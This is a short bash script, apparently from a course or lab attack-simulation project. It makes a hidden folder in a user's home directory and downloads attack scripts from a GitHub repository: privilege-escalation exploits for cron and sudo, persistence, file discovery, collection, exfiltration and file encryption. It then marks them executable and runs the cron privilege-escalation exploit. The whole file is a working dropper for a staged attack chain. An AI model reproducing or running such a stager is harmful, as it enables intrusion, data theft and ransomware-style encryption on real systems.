#!/bin/bash
cd /home/resch
# Create hidden folder
mkdir .scripts
cd /home/resch/.scripts
#PE
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_PEexploitCron.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_PEexploitSudo.sh
# Persistence
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_persistence1.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_persistence2.sh
# File discovery
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_file_and_dir_discovery.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_file_and_dir_discovery-stripped.sh
# Collection
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_collectiontarget.sh
# Exfiltration
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_exfiltration_target.sh
# Encryption
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/check.sh
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/Gp5_encrypt.py
# Attack chain
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_attack_chain.sh
# Chmod execute
chmod -R +x /home/resch/.scripts
# Other files
wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/requirements.txt

echo "Start of exploit...."
echo "Running PE exploit for cronjob..."
./Gp5_PEexploitCron.sh

# if the PE did not work, run the other PE exploit ./Gp5_PEexploitSudo.sh
#./Gp5_PEexploitSudo.sh
